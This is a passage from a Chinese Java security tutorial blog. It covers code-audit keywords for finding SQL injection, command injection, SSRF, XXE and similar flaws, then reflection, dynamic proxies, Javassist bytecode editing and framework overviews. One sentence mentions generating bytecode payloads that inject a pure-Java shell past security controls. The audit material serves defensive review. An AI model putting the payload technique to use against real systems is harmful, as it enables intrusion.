web的内容，其实sql，xss等多数漏洞和其他的语言类似，所以不对具体的漏洞原理做分析，本文主要就是对审计关键字的提炼。学习java web具体代码程序的触发过程，不仅可以加深对漏洞的理解，如果你需要从事代码审计等工作，都会有很大的帮助。详细的代码可参考：https://github.com/JoyChou93/java-sec-code。\n\n# SQL漏洞\n\njava产生的漏洞形式主要有两种：\n\n1. 和其他语言一样，通过拼接字符串导致sql\n\n2. 使用myhabits数据库时，用${}拼接了字符串\n\n   ![](/images/a4/1.png)\n\n**审计：**\n\n1. 查看配置文件确定使用的数据库有哪些\n2. 查看所有的controller，看是存在数据库操作的动作\n3. 查看mapper，看是否使用了字符串拼接或者${}\n4. 上述都不管用的时候，直接搜select *等关键字，看具体数据库怎么操作的\n\n# XSS漏洞\n\n这个和其他语言都一样。\n\n**审计：**\n\n1. 查看所有的controller，看返回是否有把未过滤的字符返回给前端\n\n# 命令注入\n\n主要有下面两种两种方法\n\n```java\nRuntime.getRuntime().exec(cmds);\nnew ProcessBuilder(cmds).start();\n```\n\n**审计：**\n\n1. 全局搜索关键字 getRuntime.exec( 和 ProcessBuilder().start\n\n# SSIT\n\njava模板注入，主要是由两个组件velocity和freemarker产生的。\n\n**审计：**\n\n1. 可以查看pom.xml中是否使用了上述两种组件\n2. 全局搜关键字 new VelocityContext( 和 new StringTemplateLoader( \n\n# 重定向漏洞\n\n主要有三种：\n\n1. redirect(@RequestParam(\"url\")\n2. response.setHeader(\"Location\", url);\n3. response.sendRedirect(url); \n\n**审计：**\n\n1. 全局搜索上面三个函数 redirect(, reponse.setHeader(, response.sendRedirect\n\n# 目录穿越漏洞\n\n查看所有controller查找文件相关的操作。\n\n**审计：**\n\n1. 查找 new File( 等关键字\n\n# SSRF漏洞\n\n查看所有controller操作url相关的函数，查找如下一些关键字。\n\n**审计**：\n\n1. new URL(\n2. urlConnection.getInputStream(\n3. HttpURLConnection\n4. Request.Get(\n5. .openStream(\n\n# 文件上传漏洞\n\n查看所有controller有关上传操作的函数，查找如下一些关键字\n\n**审计：**\n\n1. .getOriginalFilename(\n2. .write(\n3. new File(\n\n# XXE漏洞\n\njava解析xml的格式比较多，整理如下关键字\n\n**审计：**\n\n1. XMLReaderFactory.createXMLReader\n2. new SAXBuilder(\n3. new SAXReader(\n4. SAXParserFactory.newInstance(\n5. new Digester(\n6. DocumentBuilderFactory.newInstance(\n","tags":["JAVA","web漏洞","代码审计"],"categories":["JAVA安全教程"]},{"title":"JAVA反射与动态代理","url":"/2019/01/28/JAVA反射与动态代理/","content":"# JAVA反射\n\n## 什么是Java反射\n\n反射是Java的特征之一，是一种**间接操作目标对象的机制**，核心是JVM在运行的时候才动态加载类，并且对于任意一个类，都能够知道这个类的所有属性和方法，调用方法/访问属性，不需要提前在编译期知道运行的对象是谁，他允许运行中的Java程序获取类的信息，并且可以操作类或对象内部属性。程序中对象的类型一般都是在编译期就确定下来的，而当我们的程序在运行时，可能需要动态的加载一些类，这些类因为之前用不到，所以没有加载到jvm，这时，使用Java反射机制可以在**运行期动态的创建对象并调用其属性**，它是在运行时根据需要才加载。\n<!-- more -->\n## 反射的原理\n\n![](/images/a2/1.png)\n\n## 反射的优缺点\n\n**优点：**使用反射，我们就可以在运行时获得类的各种内容，进行反编译，对于Java这种先编译再运行的语言，能够让我们很方便的创建灵活的代码，这些代码可以在运行时装配，无需在组件之间进行源代码的链接，更加容易实现面向对象。\n\n**缺点：**\n\n1. 反射会消耗一定的系统资源，因此，如果不需要动态地创建一个对象，那么就不需要用反射；\n2. 反射调用方法时可以忽略权限检查，因此可能会破坏封装性而导致安全问题。\n\n## 反射的用途\n\n1. 反编译：.class-->.java\n2. 通过反射机制访问java对象的属性，方法，构造方法等\n3. 当我们在使用IDEA时，当我们输入一个对象或者类，并想调用他的属性和方法是，一按点号，编译器就会自动列出他的属性或者方法，这里就是用到反射。\n4. 反射最重要的用途就是开发各种通用框架。比如很多框架（Spring）都是配置化的（比如通过XML文件配置Bean），为了保证框架的通用性，他们可能需要根据配置文件加载不同的类或者对象，调用不同的方法，这个时候就必须使用到反射了，运行时动态加载需要的加载的对象。\n\n## 反射机制常用的类\n\n```Java\nJava.lang.reflect.Constructor;\nJava.lang.reflect.Field;\nJava.lang.reflect.Method;\nJava.lang.reflect.Modifier;\n```\n\n## 反射的基本使用\n\n- Object.getclass()   //需要创建对象\n\n- Object.class    //需要导入对应的类包\n\n- Class.forName    //最常用\n\n**代码实例：**\n\n1、创建一个需要被反射的测试类\n\n```java\nimport static java.lang.System.out;\nimport java.lang.String;\n\npublic class User {\n    private String username;\n    public String interest;\n\n    public User() {\n        ;\n    }\n\n    private User(String name) {\n        System.out.println(\"init.\");\n    }\n\n    public String getUsername(){\n        return username;\n    }\n\n    public void setUsername(String username){\n        this.username = username;\n    }\n\n    public String getInterest(){\n        return interest;\n    }\n\n    public void setInterest(String interest){\n        this.interest = interest;\n    }\n\n    public static void main(String args[]) {\n        User userinfo = new User();\n        userinfo.setUsername(\"xiaoming\");\n        out.println(userinfo.getUsername());\n    }\n}\n```\n\n2、反射调用User类\n\n```java\nimport java.lang.reflect.*;\nimport java.lang.reflect.InvocationTargetException;\nimport java.lang.System;\nimport java.lang.String;\n\npublic class Reflect {\n    public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException {\n        Class clazz = Class.forName(\"User\"); //包路径，这里测试写在同目录\n\n        System.out.println(\"===获取公共的构造函数===\");\n        Constructor[] constructors = clazz.getConstructors();\n        for (Constructor constructor: constructors)\n            System.out.println(constructor);\n\n        System.out.println(\"===获取所有的构造函数===\");\n        Constructor[] declaredConstructors = clazz.getDeclaredConstructors();\n        for (Constructor constructor: declaredConstructors)\n            System.out.println(constructor);\n\n        System.out.println(\"===获取公共的属性===\");\n        Field[] fields = clazz.getFields();\n        for (Field field: fields)\n            System.out.println(field);\n\n        System.out.println(\"===获取所有的属性===\");\n        Field[] declaredFields = clazz.getDeclaredFields();\n        for (Field field: declaredFields)\n            System.out.println(\"ALL: \" + field);\n        \n        System.out.println(\"===获取特定的函数===\");\n        Method method = clazz.getDeclaredMethod(\"setUsername\", String.class);\n        System.out.println(method);\n\n        //赋值操作\n        Object obj = clazz.getConstructor().newInstance();\n        Object invoke = method.invoke(obj, new String[]{\"我是科比\"});\n\n        System.out.println(\"===测试===\");\n        String name= (String) clazz.getDeclaredMethod(\"getUsername\").invoke(obj);\n        System.out.println(name);\n    }\n}\n```\n\n![](/images/a2/2.png)\n\n这个只做了部分的测试，get\\_系列方法的是获取公用，getDeclared\\_系列方法获取所有，get_(参数)系列获取特定的。如果需要查看所有的方法，可以查看官方文档，或者IDEA跟进Class.java文件查看。这边需要注意的是 method.invoke(obj, args) ，**如果method是静态方法，obj是可以省略的。**\n\n# JAVA动态代理\n\n## 代理模式简介\n\n代理模式是一种常用的设计模式。代理模式为其对象提供了一种代理以控制对这个对象的访问。代理模式可以将主要业务与次要业务进行松耦合的组装。根据代理类的创建时机和创建方式的不同，可以将其分为静态代理和动态代理两种形式：\n\n- 在程序运行前就已经存在的编译好的代理类是为静态代理，\n- 在程序运行期间根据需要动态创建代理类及其实例来完成具体的功能是为动态代理。\n\n## 动态代理简介\n\n对代理模式而言，一般来说，具体主题类与其代理类是一一对应的，这也是静态代理的特点。但是，也存在这样的情况：有N个主题类，但是代理类中的“预处理、后处理”都是相同的，仅仅是调用主题不同。那么，若采用静态代理，必然需要手动创建N个代理类，这显然让人相当不爽。动态代理则可以简单地为各个主题类分别生成代理类，**共享“预处理，后处理”功能**，这样可以大大减小程序规模，这也是动态代理的一大亮点。\n\n在动态代理中，代理类是在运行时期生成的。因此，相比静态代理，动态代理可以很方便地对委托类的相关方法进行统一增强处理，如添加方法调用次数、添加日志功能等等。\n\n### JDK动态代理机制的相关类与接口\n\n**java.lang.reflect.Proxy：**该类用于动态生成代理类，只需传入被监控对象隶属的类文件在内存中真实地址、被监控对象隶属的类文件实现接口以及InvocationHandler通知对象便可为目标接口生成代理类及代理对象。\n\n```\n// 方法 1: 该方法用于获取指定代理对象所关联的InvocationHandler static InvocationHandler\ngetInvocationHandler(Object proxy)\n\n// 方法 2：该方法用于获取关联于指定类装载器和一组接口的动态代理类的类对象 static Class\ngetProxyClass(ClassLoader loader, Class[] interfaces)\n\n// 方法 3：该方法用于判断指定类是否是一个动态代理类 static boolean isProxyClass(Class cl)\n\n// 方法 4：该方法用于为指定类装载器、一组接口及调用处理器生成动态代理类实例 static Object\nnewProxyInstance(ClassLoader loader, Class[] interfaces,\nInvocationHandler h)\n```\n\n**java.lang.reflect.InvocationHandler：**该接口包含一个invoke方法，通过该方法实现对委托类的代理的访问，是代理类完整逻辑的集中体现，包括要切入的增强逻辑和进行反射执行的真实业务逻辑。\n\n```\nObject invoke(Object proxy, Method method, Object[] args)\n```\n\n该方法是代理类完整逻辑的集中体现。在被监控行为将要执行时，会被JVM拦截。被监控行为和行为实现方法会被作为参数输送invoke，通常通过反射完成对具体角色业务逻辑的调用，并对其进行增强。\n\n- 第一个参数既是代理类实例。\n- 第二个参数是被调用的方法对象。\n- 第三个方法是调用参数。\n\n**java.lang.ClassLoader：**类加载器类，负责将类的字节码装载到Java虚拟机中并为其定义类对象，然后该类才能被使用。Proxy静态方法生成动态代理类同样需要通过类加载器来进行加载才能使用，它与普通类的唯一区别就是其字节码是由JVM在运行时动态生成的而非预存在于任何一个.class 文件中。JDK动态代理使用步骤\n\n### JDK动态代理的一般步骤\n\n1、创建被代理的接口和类；\n\n2、实现InvocationHandler接口，对目标接口中声明的所有方法进行统一处理；\n\n3、调用Proxy的静态方法，创建代理类并生成相应的代理对象；\n\n4、使用代理。\n\n### 生活案例\n\n**饭前便后要洗手**\n一、分析出主要业务和次要业务\n【主要业务】：吃饭，上厕所\n【次要业务】：洗手\n\n二、JDK代理模式实现\n\n1. 接口角色： 定义所有需要被监听行为\n2. 接口实现类：中国人、印度人\n3. 通知类：\n   - 次要业务进行具体实现\n   - 通知JVM，当前被拦截的主要业务方法与次要业务方法应该如何绑定执行\n\n4. 监控对象（代理对象）\n   - 被监控实例对象 需要被监控的行为\n   - 具体通知类实例对象\n\n### 代码实现\n\n1、定义接口类\n\n```java\npublic interface BaseService {\n    void eat();\n    void wc();\n}\n```\n\n2、编写接口的实现类，即具有某些行为的实体\n\n```java\npublic class Person implements BaseService {\n\n    @Override\n    public void eat() { //主要业务，代理模式要求开发人员只关心主要业务\n        System.out.println(\"吃饭.\");\n    }\n\n    @Override\n    public void wc() {\n        System.out.println(\"上厕所.\");\n    }\n}\n```\n\n3、创建通知类\n\n```java\nimport java.lang.reflect.InvocationHandler;\nimport java.lang.reflect.Method;\n\npublic class Invocation implements InvocationHandler {\n\n    private BaseService obj;//具体被监控对象\n\n    public Invocation(BaseService param){\n        this.obj = param;\n    }\n\n    /*\n     *\n     *  invoke方法：在被监控行为将要执行时，会被JVM拦截\n     *             被监控行为和行为实现方会被作为参数输送invoke\n     *             ****\n     *             通知JVM,这个被拦截方法是如何与当前次要业务方法绑定实现\n     *  invoke方法三个参数\n     *\n     *           int v= 小明.eat();//JVM拦截\n     *            eat方法封装为Mehtod类型对象\n     *            eat方法运行时接受所有的实参封装到Object[]\n     *            将负责监控小明的代理对象作为invoke方法第一个参数\n     *\n     */\n    @Override\n    public Object invoke(Object proxy, Method method, Object[] params) throws Throwable {\n        //1.局部变量，接受主要业务方法执行完毕后返回值\n        Object value;\n        //2.确认当前被拦截行为\n        String methodName= method.getName();\n        //3.根据被拦截行为不同，决定主要业务和次要业务如何绑定执行\n        if(\"eat\".equals(methodName)){//饭前要洗手\n            wash();                            //洗手\n            value=method.invoke(this.obj, params);   //吃饭\n        }else{//便后要洗手\n            value=method.invoke(this.obj, params);\n            wash();\n        }\n        return value; //返回被拦截方法，需要调用地方\n    }\n\n    //次要业务\n    public void wash(){\n        System.out.println(\"-----洗手----\");\n    }\n}\n```\n\n4、创建监控对象，通过Proxy类的静态方法newProxyInstance创建代理对象\n\n```java\nimport java.lang.reflect.InvocationHandler;\nimport java.lang.reflect.Proxy;\n\nclass ProxyFactory {\n    /*\n     *\n     *  JDK动态代理模式下，代理对象的数据类型\n     *  应该由监控行为来描述\n     *  参数： Class文件，监控类\n     */\n    public static BaseService Builder(Class classFile) throws Exception {\n\n        //1.创建被监控实例对象\n        BaseService obj = (BaseService) classFile.newInstance();\n        //2.创建一个通知对象 用接口来描述\n        InvocationHandler adviser = new Invocation(obj);\n        //3.向JVM申请负责监控obj对象指定行为的监控对象（代理对象）\n        /*\n         *  loader:被监控对象隶属的类文件在内存中真实地址\n         *  interfaces:被监控对象隶属的类文件实现接口\n         *  adviser：监控对象发现小明要执行被监控行为，应该由哪一个通知对象进行辅助\n         */\n        BaseService $proxy = (BaseService) Proxy.newProxyInstance(\n                obj.getClass().getClassLoader(),\n                obj.getClass().getInterfaces(),\n                adviser);\n        return $proxy;\n    }\n}\n```\n\n5、测试\n\n```java\nimport java.lang.*;\n\npublic class Test {\n    public static void main(String[] args) throws Exception {\n        BaseService mike= ProxyFactory.Builder(Person.class);\n        mike.eat();\n        System.out.println(\"================\");\n        mike.wc();\n    }\n}\n```\n\n![](/images/a2/3.png)\n\n\n\n# JAVA动态字节码\n\n## 动态字节码技术\n\nJava 代码都是要被编译成字节码后才能放到 JVM 里执行的，而字节码一旦被加载到虚拟机中，就可以被解释执行。字节码文件（.class）就是普通的二进制文件，它是通过 Java 编译器生成的。而只要是文件就可以被改变，**如果我们用特定的规则解析了原有的字节码文件，对它进行修改或者干脆重新定义，这不就可以改变代码行为了么**。动态字节码技术优势在于 Java 字节码生成之后，对其进行修改，增强其功能，这种方式相当于对应用程序的二进制文件进行修改。\n\n通过动态编程的方式，我可以直接对已经存在的java字节码进行操作，也可以在内存中动态生成JAVA代码，动态编译执行，在安全中常用于生成payload，这种方式生成的payload优点：**能够注入pure-java的shell来绕过java原生的安全防护。**\n\nJava 生态里有很多可以动态处理字节码的技术，比较流行的有两个，一个是 ASM，一个是 Javassist 。\n\n- ASM：直接操作字节码指令，执行效率高，但涉及到JVM的操作和指令，要求使用者掌握Java类字节码文件格式及指令，对使用者的要求比较高。\n\n- Javassist：提供了更高级的API，执行效率相对较差，但无需掌握字节码指令的知识，简单、快速，对使用者要求较低。\n\n## Javassist简介\n\nJavassist 是一个开源的分析、编辑和创建Java字节码的类库。其主要的优点，**在于简单，而且快速。直接使用 java 编码的形式，而不需要了解虚拟机指令，就能动态改变类的结构，或者动态生成类。**\n\nJavassist 中最为重要的是 **ClassPool，CtClass ，CtMethod 以及 CtField** 这几个类。\n\n```\nClassPool：一个基于 Hashtable 实现的 CtClass 对象容器，其中键是类名称，值是表示该类的 CtClass 对象。\nCtClass：CtClass 表示类，一个 CtClass (编译时类）对象可以处理一个 class 文件，这些 CtClass 对象可以从 ClassPool 获得。\nCtMethods：表示类中的方法。\nCtFields ：表示类中的字段。\n```\n\n下面以简单的一个实例来说明下基本的使用方法。这个实例是在执行完类中的方法时候加入一些操作。\n\n1、定义个测试类User\n\n```java\npackage com.demo.manba;\n\nimport java.lang.String;\n\npublic class User {\n    private String name;\n\n    public User() {\n    }\n\n    public String getUser() {\n        return this.name;\n    }\n\n    public void setUser(String name) {\n        this.name = name;\n    }\n\n}\n```\n\n2、 执行\n\n```java\npackage com.demo.manba;\n\nimport javassist.*;\nimport java.lang.reflect.InvocationTargetException;\n\npublic class DynGenerateClass {\n    public static void main(String[] args) throws NotFoundException, CannotCompileException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException {\n            // 获取默认池\n            ClassPool pool = ClassPool.getDefault();\n            CtClass cc = pool.get(\"com.demo.manba.User\");\n            // 获取所有方法\n            CtMethod[] cms = cc.getDeclaredMethods();\n            for(CtMethod cm:cms){\n                System.out.println(cm.getName());\n            }\n            // 在执行setUser方法后执行\n            cms[1].insertAfter(\"System.out.println(\\\"I hava execute setUser Success.\\\");\");\n            Class clazz = cc.toClass();\n            // 实例化\n            User u=(User) clazz.getConstructor(new Class[]{}).newInstance(new Object[]{});\n            u.setUser(\"mike\");\n            System.out.println(u.getUser());\n            // cc.writeFile();\n        }\n\n}\n```\n\n输出\n\n![](/images/a2/4.png)\n\n**参考：**\n\nhttps://blog.csdn.net/a745233700/article/details/82893076\n\nhttps://blog.csdn.net/vae1314chuanchen/article/details/87974728\n\nhttps://blog.csdn.net/justloveyou_/article/details/79407248\n\nhttps://blog.csdn.net/vae1314chuanchen/article/details/78266299\n","tags":["JAVA","动态代理","反射"],"categories":["JAVA安全教程"]},{"title":"JAVA框架介绍","url":"/2018/12/04/JAVA框架介绍/","content":"# 什么是框架\n\n在编程领域，软件框架是指一种抽象形式，它提供了一个具有通用功能的软件，这些功能可以由使用者编写代码来有选择的进行更改，从而提供服务于特定应用的软件。软件框架提供了一种标准的方式来构建并部署应用。\n<!-- more -->\n# Struts2框架介绍\n\n直接上图\n\n![](/images/a3/1.png)\n\nStruts2框架最主要的两个组件就是过滤器和拦截器，其中用到的思想就是上一章的反射和动态代理。\n\n**工作流程：**\n\n1. 客户端浏览器发送HTTP请求到Web应用\n2. Web容器将请求传递到标准ActionContextCleanUp过滤器以消除属性，而不让后续过滤器清楚，以延长Action中属性（包括自定义属性）的生命周期。\n3. 再经过如stimesh等其他过滤器后，请求传递给StrutsPrepareAndExecuteFilter核心控制器\n4. StrutsPrepareAndExecuteFilter调用ActionMapper（Action映射器）确定调用哪个Action，再将控制权转移给ActionProxy代理\n5. ActionProxy代理调用配置管理器ConfigurationManager从配置文件struts.xml中读取配置信息，然后创建ActionInvocation对象\n6. ActionInvocation在调用拦截器链中的拦截器后再调用Action，根据Action返回的结果字符串查找对应的Result\n7. Result调用视图模板，再以相反的顺序执行拦截器链，返回HTTP响应\n8. HTTP响应以相反的顺序返回给核心控制器StrutsPrepareAndExecuteFilter以及其他web.xml中定义的过滤器，最终返回给客户端\n\nstruts2可以说是上一代的web框架，现在基本很少互联网会使用strust2，一来安全问题较多，二来现在有更方便的springboot框架，基本可以说被遗弃了。但是作为安全学习，我们还是有必要了解下基本的框架体系，如果想要深入的学习，可以网上自己搜索，作为曾经火遍大江南北的web框架，网上资料还是很多的。\n\n# Spring框架介绍\n\nspring是一个一站式开发框架集，功能十分强大，就像一个大家族，有众多衍生产品，例如：springboot、springcloud、springsecurity等等。但他们都是基于spring的ioc和aop，**ioc提供了依赖注入的容器，aop解决了面向切面的编程**，然后在这两者的基础上实现了其他衍生产品的高级功能。\n\n## 什么是IOC\n\n控制反转（Inversion of Control）不是技术，是一种**设计思想**。所谓控制反转是指，本来被调用者的实例是由调用者来创建的，这样的缺点是耦合性太强，IOC则是统一交给spring来管理创建，将对象交给容器管理，你只需要在spring配置文件总配置相应的bean，以及设置相关的属性，让spring容器来生成类的实例对象以及管理对象。在spring容器启动的时候，spring会把你在配置文件中配置的bean都初始化好，然后在你需要调用的时候，就把它已经初始化好的那些bean分配给你需要调用这些bean的类。 \n\n传统设计\n\n![](/images/a3/2.png)\n\nioc思想\n\n![](/images/a3/3.png)\n\n## 什么是AOP\n\n面向切面编程（Aspect Oriented Programming）它与 OOP( Object-Oriented Programming, 面向对象编程) 相辅相成，提供了与 OOP 不同的抽象软件结构的视角来思考程序的结构，通过这种方式弥补面向对象编程(Object Oriented Programming)的不足。除了类以外，AOP提供了切面，切面对关注点进行模块化，例如横切多个类型和对象的事务管理（这些关注点术语通常称作横切(crosscutting)关注点）。Spring AOP是Spring的一个重要组件，但是Spring IOC并不依赖于Spring AOP，这意味着你可以自由选择是否使用AOP，AOP提供了强大的中间件解决方案，这使得Spring IOC更加完善。我们可以通过AOP来实现**日志监听，事务管理，权限控制**等等。\n\n**概念：**\n\n```\n切面（Aspect）：一个关注点的模块化，这个关注点可能会横切多个对象。事务管理是J2EE应用中一个关于横切关注点的很好的例子。在Spring AOP中，切面可以使用基于模式）或者基于@Aspect注解的方式来实现。\n\n连接点（Joinpoint）：在程序执行过程中某个特定的点，比如某方法调用的时候或者处理异常的时候。在Spring\nAOP中，一个连接点总是表示一个方法的执行。\n\n通知（Advice）：在切面的某个特定的连接点上执行的动作。其中包括了“around”、“before”和“after”等不同类型的通知（通知的类型将在后面部分进行讨论）。许多AOP框架（包括Spring）都是以拦截器做通知模型，并维护一个以连接点为中心的拦截器链。\n\n切入点（Pointcut）：匹配连接点的断言。通知和一个切入点表达式关联，并在满足这个切入点的连接点上运行（例如，当执行某个特定名称的方法时）。切入点表达式如何和连接点匹配是AOP的核心：Spring缺省使用AspectJ切入点语法。\n\n引入（Introduction）：用来给一个类型声明额外的方法或属性（也被称为连接类型声明（inter-type\ndeclaration））。Spring允许引入新的接口（以及一个对应的实现）到任何被代理的对象。例如，你可以使用引入来使一个bean实现IsModified接口，以便简化缓存机制。\n\n目标对象（Target Object）： 被一个或者多个切面所通知的对象。也被称做被通知（advised）对象。 既然Spring\nAOP是通过运行时代理实现的，这个对象永远是一个被代理（proxied）对象。\n\nAOP代理（AOP Proxy）：AOP框架创建的对象，用来实现切面契约（例如通知方法执行等等）。在Spring中，AOP代理可以是JDK动态代理或者CGLIB代理。\n\n织入（Weaving）：把切面连接到其它的应用程序类型或者对象上，并创建一个被通知的对象。这些可以在编译时（例如使用AspectJ编译器），类加载时和运行时完成。Spring和其他纯Java AOP框架一样，在运行时完成织入。\n\n通知类型：\n\n前置通知（Before advice）：在某连接点之前执行的通知，但这个通知不能阻止连接点之前的执行流程（除非它抛出一个异常）。\n\n后置通知（After returning advice）：在某连接点正常完成后执行的通知：例如，一个方法没有抛出任何异常，正常返回。\n\n异常通知（After throwing advice）：在方法抛出异常退出时执行的通知。\n\n最终通知（After (finally) advice）：当某连接点退出的时候执行的通知（不论是正常返回还是异常退出）。\n\n环绕通知（Around Advice）：包围一个连接点的通知，如方法调用。这是最强大的一种通知类型。环绕通知可以在方法调用前后完成自定义的行为。它也会选择是否继续执行连接点或直接返回它自己的返回值或抛出异常来结束执行。\n```\n\n看完了上面的理论部分知识, 相信大家还是对AOP 的概念云里雾里的, 因为 AOP 中的概念是在是太多了, 我们也不必理解的那么透彻，直接从网上找个例子说明一下 AOP 中 Aspect，Joint point，Point cut 与 Advice之间的关系。\n\n```\n让我们来假设一下，从前有一个叫爪哇的小县城，在一个月黑风高的晚上，这个县城中发生了命案。 作案的凶手十分狡猾，现场没有留下什么有价值的线索。不过万幸的是，刚从隔壁回来的老王恰好在这时候无意中发现了凶手行凶的过程，但是由于天色已晚，加上凶手蒙着面，老王并没有看清凶手的面目，只知道凶手是个男性，身高约七尺五寸。 爪哇县的县令根据老王的描述，对守门的士兵下命令说: 凡是发现有身高七尺五寸的男性，都要抓过来审问。 士兵当然不敢违背县令的命令，只好把进出城的所有符合条件的人都抓了起来。\n\n来让我们看一下上面的一个小故事和 AOP 到底有什么对应关系。\n\n首先我们知道，在 Spring AOP 中 Joint point 指代的是所有方法的执行点，而 point cut 是一个描述信息，它修饰的是 Joint point，通过 point cut，我们就可以确定哪些 Joint point 可以被织入 Advice。 对应到我们在上面举的例子，我们可以做一个简单的类比，Joint point 就相当于 爪哇的小县城里的百姓,pointcut 就相当于 老王所做的指控，即凶手是个男性，身高约七尺五寸，而 Advice 则是施加在符合老王所描述的嫌疑人的动作: 抓过来审问。\n为什么可以这样类比呢?\n\nJoint point ： 爪哇的小县城里的百姓: 因为根据定义，Joint point 是所有可能被织入 Advice 的候选的点，在 Spring AOP中，则可以认为所有方法执行点都是 Joint point。 而在我们上面的例子中，命案发生在小县城中，按理说在此县城中的所有人都有可能是嫌疑人。\n\nPointcut ：男性，身高约七尺五寸: 我们知道，所有的方法(joint point) 都可以织入 Advice，但是我们并不希望在所有方法上都织入 Advice，而 Pointcut 的作用就是提供一组规则来匹配join point，给满足规则的 join point 添加 Advice。 同理，对于县令来说，他再昏庸，也知道不能把县城中的所有百姓都抓起来审问，而是根据凶手是个男性，身高约七尺五寸，把符合条件的人抓起来。 在这里 凶手是个男性，身高约七尺五寸 就是一个修饰谓语，它限定了凶手的范围，满足此修饰规则的百姓都是嫌疑人，都需要抓起来审问。\n\nAdvice ：抓过来审问，Advice 是一个动作，即一段 Java 代码，这段 Java 代码是作用于 point cut 所限定的那些 Joint point 上的。 同理，对比到我们的例子中，抓过来审问 这个动作就是对作用于那些满足 男性，身高约七尺五寸 的爪哇的小县城里的百姓。\n\nAspect:：Aspect 是 point cut 与 Advice 的组合，因此在这里我们就可以类比: “根据老王的线索，凡是发现有身高七尺五寸的男性，都要抓过来审问” 这一整个动作可以被认为是一个 Aspect。\n```\n\n说完AOP专业名词的概念，再来说下AOP具体的。相信大家对于OOP的理解不难，就以人（people）来说，我们就可以把它看做一类对象，people有身高、体重、年龄等属性，也有跑步、吃饭、睡觉、娱乐等行为，把这些属于people的属性和行为封装在people类中，然后以统一调用的方式（创建一个people类实例对象，通过这个对象实例来调用这些属性和行为）就叫做OOP思想。\n\nOOP给我们的感觉就是结构清晰，高内聚，易维护等。这些属于一种从上到下的关系（即这个类封装的所有属性和方法都是属于people的），而我们的AOP思想就是一种从左到右的关系，以切入的方式将业务逻辑功能应用到每一层结构中（可以理解为类方法，类方法也是一种对象的行为实现）。\n\n举个例子，people也可以分为少年、青年、中年、和老年，这几类人除了拥有自己的属性和行为外，生活中，或许还需要去医院看病，但是医院看病这一个逻辑业务功能并不是属于哪一类，而是谁生病了，才需要到医院看病，而基于面向对象编程的思想，我们是不可能把这一个业务逻辑行为加到每一个类中的，这不符合OOP思想，而这个就是AOP所做也可以做到事情了，AOP就是把医院看病这一个业务逻辑功能抽取出来，然后动态把这个功能注入到需要的方法（或行为）中，以后，不管是谁需要看病，就到医院这个第三方机构看病（AOP就是相当于把这个第三方机构独立出来），**这样从业务逻辑角度上，AOP达到了更近一步的的解耦，所以我们也称AOP是对OOP的完善和增强。**\n\n而我们的编程中，常用到AOP的就是安全校验、日志操作、事务操作等，接下来一张图认识AOP思想：\n\n![](/images/a3/4.png)\n\n AOP就是使用上图所示的“横切”技术，AOP把软件系统分为两个部分：**核心关注点和横切关注点**。业务处理的主要流程是核心关注点，与之关系不大的部分是横切关注点。横切关注点的一个特点是，他们经常发生在核心关注点的多处，而各处都基本相似。比如权限认证、日志、事务处理。Aop 的作用在于分离系统中的各种关注点，将核心关注点和横切关注点分离开来。正如Avanade公司的高级方案构架师Adam Magee所说，AOP的核心思想就是**“将应用程序中的商业逻辑同对其提供支持的通用服务进行分离。”**\n\n## SpringMVC框架\n\n**SpringMVC** 是基于 Java 语言实现 MVC 设计模式的请求驱动类型的轻量级 Web 框架，目的是将 Web 开发模块化及代码简化。其提供了 DispatcherServlet 前端控制器分派请求，同时提供灵活的配置处理程序映射、视图解析，并支持文件上传。\n\n![](/images/a3/5.png)\n\n\n\n## MyBatis框架\n\nMyBatis 是一款优秀的持久层框架，它支持定制化 SQL、存储过程以及高级映射。MyBatis 避免了几乎所有的 JDBC 代码和手动设置参数以及获取结果集。MyBatis 可以使用简单的 XML 或注解来配置和映射原生类型、接口和 Java 的 POJO（Plain Old Java Objects，普通老式 Java 对象）为数据库中的记录。\n\n![](/images/a3/6.png)\n\n**MyBatis 的优点如下：**\n\n- 封装了 JDBC 大部分操作，减少开发人员工作量；\n- 相比一些自动化的 ORM 框架，“半自动化”使得开发人员可以自由的编写 SQL 语句，灵活度更高；\n- Java 代码与 SQL 语句分离，降低维护难度；\n- 自动映射结果集，减少重复的编码工作；\n- 开源社区十分活跃，文档齐全，学习成本不高。\n\n## SpringBoot框架\n\n### 什么是SpringBoot\n\nSpring Boot 是所有基于 Spring 开发的项目的起点。Spring Boot 的设计是为了让你尽可能快的跑起来 Spring 应用程序并且尽可能减少你的配置文件。简单来说就是SpringBoot其实不是什么新的框架，它默认配置了很多框架的使用方式，就像maven整合了所有的jar包，spring boot整合了所有的框架（不知道这样比喻是否合适）。\n\n### SpringBoot四个主要特性\n\n1. SpringBoot Starter：他将常用的依赖分组进行了整合，将其合并到一个依赖中，这样就可以一次性添加到项目的Maven或Gradle构建中；\n\n2. 自动配置：SpringBoot的自动配置特性利用了Spring4对条件化配置的支持，合理地推测应用所需的bean并自动化配置他们；\n\n3. 命令行接口：（Command-line-interface, CLI）：SpringBoot的CLI发挥了Groovy编程语言的优势，并结合自动配置进一步简化Spring应用的开发；\n\n4. Actuatir：它为SpringBoot应用的所有特性构建一个小型的应用程序。\n\n**简单来说，springboot也是属于spring框架中的一种，但是springboot”约定大于配置“的丽娘，极大简化了spring应用的初始搭建以及开发过程**\n\n# 框架比较\n\n**struts2 和 springMvc：**\n\n1. springmvc入口是一个servlet前端控制器(DispatcherServlet)，struts2入口是一filter过滤器(StrutsPrepareAndExecuteFilter)。\n\n2. struts2通过在action类中定义成员变量接收参数，(属性驱动和模型驱动)，它只能使用多例模式管理action。springmvc通过在coontroller方法中定义形参接收参数，springmvc可以使用单例模式管理controller。 \n\n3. springmvc是基于方法开发的，注解开发中使用requestMapping将url和方法进行映射，如果根据url找到controller类的方法生成一个handler处理器对象(只包括一个method)。struts2是基于类开发的，每个请求过来创建一个action实例，实例对象中有若干个方法。开发中建议使用springmvc，springmvc方法更类似service业务方法。\n4. struts2采用值栈存储请求和相应的数据,通过OGNL存取数据，springmvc通过参数绑定期将request请求内容解析，并给方法形参赋值。\n5. struts2和springmvc的速度是相当的，由于struts2的漏洞较多，更多企业使用springmvc。\n\n**springMvc和springBoot：**\n\n1. springMvc属于一个企业WEB开发的MVC框架，涵盖面包括前端视图开发、文件配置、后台接口逻辑开发等，XML、config等配置相对比较繁琐复杂。\n2. 